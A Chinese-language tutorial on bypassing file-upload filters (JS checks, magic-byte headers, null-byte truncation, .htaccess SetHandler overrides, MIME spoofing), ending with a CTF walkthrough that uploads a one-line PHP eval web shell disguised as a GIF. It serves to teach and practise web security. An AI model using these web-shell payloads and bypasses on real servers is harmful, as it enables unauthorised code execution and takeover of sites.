# 文件上传之js前端过滤、waf过滤和服务端过滤

## 客户端的js绕过

### 一般会利用js来编写检测模块来对上传文件的后缀名进行检测
         
         解决的方法：1. 通过burpsuite的抓包，然后直接对文件后缀名进行更改就能实现绕过
                            2. 可以通过禁止javascript模块来进行绕过，如果是火狐浏览器可以通过在url上输入about:config来关闭javascript模块·



## waf的绕过，就是对文件里面的内容进行审计

### 通过文件幻术头部进行绕过

就是用winhex解码文件后，在文件的头部加上该文件类型特有的标志数值或在文件内容的首部加上相关信息（如：gif就写上GIF89a）

jpg
```
FF D8 FF E0 00 10 4A 46 49 48
```

png
```
89 50 4E 47
```

gif
```
47 49 46 38 39 61
```
### 对一些关键字符的禁止

#### 对php语言的字符<?的禁止的绕过方法

用php和html的混编语言进行编写
```
<script language='php'> //<?php

</script> //?>

```


## 服务器端的检测

### 白名单和黑名单

白名单：优先通过的文件类型

黑名单：禁止通过的文件类型

#### 黑名单的绕过

##### 用0x00进行截断
在php语言和c语言中，会对0x00后面的字符串进行丢弃，不会显示出来

实例
```
aaa.php0x00.txt中的0x00会丢弃.txt，最后会执行的是aaa.php文件
```

##### 特殊文件名的绕过
在windows系统当中，以点和空格结尾的后缀名，保存文件时会自动删除点和空格

实例
```
aaa.php.在windows系统中会保存为aaa.php

aaa.php 在windows系统中会保存为aaa.php
```
但是在Unix/linux系统中除外

##### .htaccess文件攻击

当我们上传文件时会一般会调用move_uoloaded_file函数，而如果没有对它的权限进行限制的话，那么当我们写一个.htaccess文件上传时，
便会调用move_uploaded_file函数对已经存在服务器的.htaccess文件进行一个覆盖

文件中的内容
```
SetHandler application/x-httpd-php //将所有类型的文件都以php来运行
```

文件内容，意思是文件中有haha的都以php运行
```

<FilesMatch "haha">

SetHandler application/x-httpd-php

</FilesMatch>

```

##### 文件名大小写绕过：pHp、AsP等


#### 白名单绕过

##### 用0x00进行截断，和黑名单的一样

##### 上传一个有代码注入的非黑名单文件，然后再调用它即可

### 服务器MIME类型的检测

在上传时，会有一个content-type字段来告诉服务器文件的类型，服务器再将此字段的值来和黑名单和白名单进行比对

因此，绕过方法，如果构造shell.php，content-type：text/plain
所以我们可以在burpsuite抓包后，对content-type字段进行更改，改为非黑名单文件类型，例如：改为content-type：image/jpg


### 服务器目录路径检测

检测路径是否合法，可以通过0x00截断的方式来绕过


对于文件上传的详细请看：
https://www.jb51.net/article/158945.htm
https://www.cnblogs.com/aslijitong/p/12821245.html


## 实例（[极客大挑战 2019]Upload1）

打开页面后发现是文件上传，此时我们想到的是文件上传漏洞，因此我们构造一个一句话木马的php文件

```
<?php eval($_GET['sys']) ?>
```

页面爆出错误，说非image，可以判断可能是js端的文件后缀名检测

因此我们用burpsuite抓包来更改后缀名，进行一个绕过

而后页面爆出限制<?符号，因此我们可以构造php和html混编的一句话木马，并抓包后将文件名改为phtml

```
<spcrit language='php'> eval($_GET['sys']) </spcrit>
```

上传后，页面返回不是image，因此可以猜测是服务器对文件相关信息进行了检测，所以我们可以通过添加相关信息进行绕过

文件内容的首部加的内容
```
GIF89a
```
而后再提交，最后成功上传，一般上传的位置都在/upload里，因此用蚁剑构造/upload/shell.phtml进行连接，得到flag